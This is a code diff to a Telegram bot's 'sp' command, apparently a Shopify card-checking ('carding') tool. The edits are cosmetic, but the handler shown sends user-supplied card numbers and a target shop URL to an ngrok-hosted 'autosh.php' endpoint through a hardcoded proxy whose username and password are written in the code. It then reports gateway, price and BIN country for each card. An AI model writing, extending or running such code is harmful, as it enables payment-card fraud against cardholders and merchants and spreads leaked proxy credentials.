@@ -2868,7 +2868,7 @@ async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     custom_url = user_data.get("custom_url")
     if not custom_url:
         await update.message.reply_text(
-            "❌ 𝓨𝓸𝓾 𝓭𝓸𝓷'𝓽 𝓱𝓪𝓿𝓮 𝓪 𝓼𝓲𝓽𝓮 𝓼𝓮𝓽. 𝓤𝓼𝓮 /seturl 𝓽𝓸 𝓼𝓮𝓽 𝔂𝓸𝓾𝓻 𝓼𝓲𝓽𝓮 𝓯𝓲𝓻𝓼𝓽.",
+            "❌ You don't have a site set. Use /seturl to set your site first.",
             parse_mode=ParseMode.HTML
         )
         return
@@ -2888,13 +2888,16 @@ async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     country_flag = bin_details.get("country_emoji", "")
 
     # API call
-    api_url = f"https://feeef80303d.ngrok-free.app/autosh.php?cc={card_input}&site={custom_url}&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+    api_url = (
+        f"https://feeef80303d.ngrok-free.app/autosh.php"
+        f"?cc={card_input}&site={custom_url}&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+    )
     try:
         async with aiohttp.ClientSession() as session:
             async with session.get(api_url, timeout=120) as resp:
                 api_text = await resp.text()
 
-        # Strip PHP warnings / HTML tags
+        # Remove PHP warnings and HTML tags
         clean_text = re.sub(r'<[^>]+>', '', api_text).strip()
         json_start = clean_text.find('{')
         if json_start != -1:
@@ -2913,13 +2916,13 @@ async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         response_text = data.get("Response", "Unknown")
         price = f"{data.get('Price', '1.0')}$"  # $ at the end
         gateway = data.get("Gateway", "-")
-        country = f"{country_flag} {country_name}"
 
         requester = f"@{user.username}" if user.username else str(user.id)
         DEVELOPER_NAME = "kคli liຖนxx"
         DEVELOPER_LINK = "https://t.me/K4linuxxxx"
         developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"
 
+        # Formatted response
         formatted_msg = (
             "═══[ #𝘀𝗵𝗼𝗽𝗶𝗳𝘆 ]═══\n"
             f"[✗] 𝐒𝐢𝐭𝐞 ➜ {custom_url}\n"
@@ -2948,6 +2951,7 @@ async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"❌ Error: <code>{escape(str(e))}</code>",
             parse_mode=ParseMode.HTML
         )
+
 
 
 
